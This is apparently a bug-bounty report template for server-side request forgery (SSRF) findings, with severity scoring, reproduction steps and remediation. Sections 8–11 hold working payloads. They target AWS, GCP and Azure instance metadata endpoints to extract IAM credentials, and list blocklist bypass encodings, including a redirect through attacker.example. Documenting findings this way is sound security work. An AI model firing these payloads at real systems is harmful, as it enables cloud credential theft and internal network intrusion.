# Server-Side Request Forgery (SSRF) — Vulnerability Report Template

> Copy this file, rename it to match your finding, and complete every section. Replace all bracketed placeholders.

## 1. Executive Summary

[One paragraph for a non-technical stakeholder. State the vulnerable feature (e.g., "URL preview," "webhook configuration," "PDF export from URL"), and the realistic impact — typically internal network reconnaissance, cloud metadata credential theft, or internal service access.]

## 2. Severity

| Field | Value |
|---|---|
| Overall Severity | [Critical / High / Medium] |
| CVSS v3.1 Vector | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N` |
| CVSS v3.1 Score | [e.g., 9.1] |
| Vulnerability Type | Server-Side Request Forgery ([Full response returned / Blind]) |

### CVSS Justification

| Metric | Value | Reasoning |
|---|---|---|
| Attack Vector (AV) | Network | Triggered via standard HTTP request to the vulnerable feature |
| Attack Complexity (AC) | Low | Reliable payload once the fetching feature is identified |
| Privileges Required (PR) | [None / Low] | [State whether the feature requires authentication] |
| User Interaction (UI) | None | Server-side fetch, no victim required |
| Scope (S) | Changed | SSRF typically crosses into a different trust zone (internal network, cloud metadata service) |
| Confidentiality (C) | High | Potential for cloud credential theft or internal data exposure |
| Integrity (I) | [None / Low] | Depends on whether internal write-capable services are reachable |
| Availability (A) | [None / Low] | Depends on whether internal services can be disrupted via the forged requests |

## 3. CWE Classification

- **CWE-918**: Server-Side Request Forgery (SSRF)

## 4. OWASP Mapping

- OWASP Top 10 2021: **A10:2021 – Server-Side Request Forgery (SSRF)**
- OWASP API Security Top 10 2023: **API7:2023 – Server Side Request Forgery**

## 5. Affected Component

| Field | Value |
|---|---|
| URL | `[https://target.example/api/fetch-preview]` |
| Parameter | `[url]` |
| HTTP Method | `[POST]` |
| Feature | [URL preview / webhook test / image import / PDF-from-URL / integration OAuth callback fetch] |
| Response Visibility | [Full — response body returned to attacker / Blind — only timing or out-of-band signal] |
| Authentication Required | [Yes / No — specify role] |

## 6. Description

[Explain the mechanism: the application accepts a user-supplied URL and performs a server-side HTTP request to it without adequately restricting the destination. Note any partial protections observed and how they were bypassed — hostname allow-lists bypassed via DNS rebinding or open redirect chaining, IP blocklists bypassed via alternate IP encodings (decimal, octal, IPv6-mapped IPv4), or scheme restrictions bypassed via `file://`/`gopher://` where supported by the underlying HTTP client.]

## 7. Preconditions

- [e.g., Requires a standard authenticated account with access to the webhook configuration feature]
- [Note any bypass required for an existing allow-list/blocklist, and the exact technique]

## 8. Attack Scenario

1. Attacker identifies a feature that fetches a user-supplied URL server-side (e.g., a "test webhook" button).
2. Attacker supplies the cloud provider's instance metadata endpoint (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`) as the target URL.
3. The server-side fetch retrieves the metadata response and returns it (or a derivative of it) to the attacker.
4. Attacker extracts temporary IAM credentials from the response.
5. Attacker uses the extracted credentials with the cloud provider's CLI/SDK to access resources the instance role is permitted to reach (e.g., internal S3 buckets, other internal APIs).

## 9. Reproduction Steps

1. Locate the feature that performs a server-side fetch of a user-supplied URL.
2. Submit the cloud metadata endpoint as the target URL: `http://169.254.169.254/latest/meta-data/`.
3. Observe the response returned by the application includes metadata service content rather than an error, confirming the request reached the internal endpoint.
4. Iterate the metadata path to reach the credentials endpoint specific to the cloud provider in use (see Section 10 for provider-specific paths).
5. If a blocklist is in place, attempt bypass techniques (see Section 10) and document which one succeeded.
6. If the response is not reflected (blind SSRF), confirm impact via an out-of-band listener instead, showing the server made the outbound request.

## 10. Proof-of-Concept Payloads

**AWS instance metadata (IMDSv1):**
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**GCP metadata:**
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header required: Metadata-Flavor: Google
```

**Azure metadata:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header required: Metadata: true
```

**Common blocklist bypasses (document only the one that applied to this target):**
```
http://[::ffff:169.254.169.254]/            # IPv6-mapped IPv4
http://2130706433/                          # decimal-encoded 127.0.0.1
http://0177.0.0.1/                          # octal-encoded 127.0.0.1
http://attacker.example/redirect-to-internal # open redirect chaining, if the fetcher follows redirects
```

> **Note**
> Only include the bypass technique actually validated against the target. Listing untested bypasses as if confirmed misrepresents the finding.

## 11. HTTP Request

```http
POST /api/fetch-preview HTTP/1.1
Host: target.example
Cookie: session=<session-token>
Content-Type: application/json
Content-Length: 68

{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

## 12. HTTP Response

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 156

{
  "preview": "ec2-instance-role-readonly\n"
}
```

[Follow-up request substituting the role name into the path, showing full temporary credential material in the response, is the strongest evidence — include it, with the actual secret access key redacted after confirming the finding to the program, unless the program explicitly requests unredacted proof through a secure channel.]

## 13. Evidence

- [ ] Request and response pair showing metadata (or internal service) content returned
- [ ] If blind: out-of-band interaction log (Burp Collaborator / interactsh) showing the server-side origin made the outbound request, with timestamp correlation
- [ ] Documentation of any allow-list/blocklist bypass technique used, with before (blocked) and after (bypassed) evidence
- [ ] If credentials were extracted: proof of validity via a single, minimally-invasive read-only API call (e.g., `aws sts get-caller-identity` equivalent), not broader use of the credentials

## 14. Impact

- **Confidentiality**: [Cloud credential exposure scope; internal network/service enumeration possible]
- **Integrity**: [State whether internal write-capable services were reachable — e.g., an internal admin API with no additional authentication]
- **Availability**: [State whether the SSRF could be used to trigger requests against internal services at volume, causing disruption]
- **Business Impact**: [e.g., IAM role compromise could permit lateral movement to other cloud resources depending on the role's attached policies; internal network mapping reduces attacker cost for follow-on attacks]

## 15. Risk Assessment

| Factor | Assessment |
|---|---|
| Likelihood | [High if unauthenticated or low-privilege; Medium if it requires elevated access to reach the feature] |
| Exploitability | [High — reliable, scriptable payload] |
| Detectability by Defender | [Low unless egress filtering or metadata service hardening (IMDSv2 enforcement) is in place] |
| Blast Radius | [Scope of the IAM role's permissions / reachable internal network segment] |

## 16. Remediation

### Short-Term
- Enforce IMDSv2 (session-token-required) on affected cloud instances immediately — this alone neutralizes simple metadata SSRF even before the application bug is fixed.
- Add an egress firewall rule blocking application server outbound access to `169.254.169.254` and other link-local/internal ranges where the application has no legitimate need to reach them.

### Long-Term
- Validate and restrict user-supplied URLs against a strict allow-list of permitted destination hosts/schemes rather than a denylist.
- Resolve the hostname server-side and validate the resulting IP against a blocklist of internal/reserved ranges (RFC 1918, link-local, loopback) **at request time**, not just at initial validation, to prevent DNS rebinding (re-check immediately before the request is dispatched, or use a fetching library with this protection built in).
- Disable automatic redirect-following in the server-side HTTP client, or re-validate the redirect target against the same allow-list before following it.
- Run the fetching functionality from an isolated network segment with no route to internal services or the metadata endpoint, as defense-in-depth.

## 17. References

- OWASP Server-Side Request Forgery Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- OWASP Top 10 2021 — A10:2021 SSRF: https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
- CWE-918: https://cwe.mitre.org/data/definitions/918.html
- AWS documentation — IMDSv2: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- PortSwigger Web Security Academy — SSRF: https://portswigger.net/web-security/ssrf

## 18. Report Notes

| Field | Value |
|---|---|
| Reported By | [handle] |
| Date Reported | [YYYY-MM-DD] |
| Program / Client | [name] |
| Report ID | [platform-assigned ID, if applicable] |
| Credential Handling | [Confirm any extracted credentials were used only for minimal validation and reported/rotated immediately, never used to access unrelated resources] |
| Retest Status | [Pending / Confirmed Fixed / Reopened] |
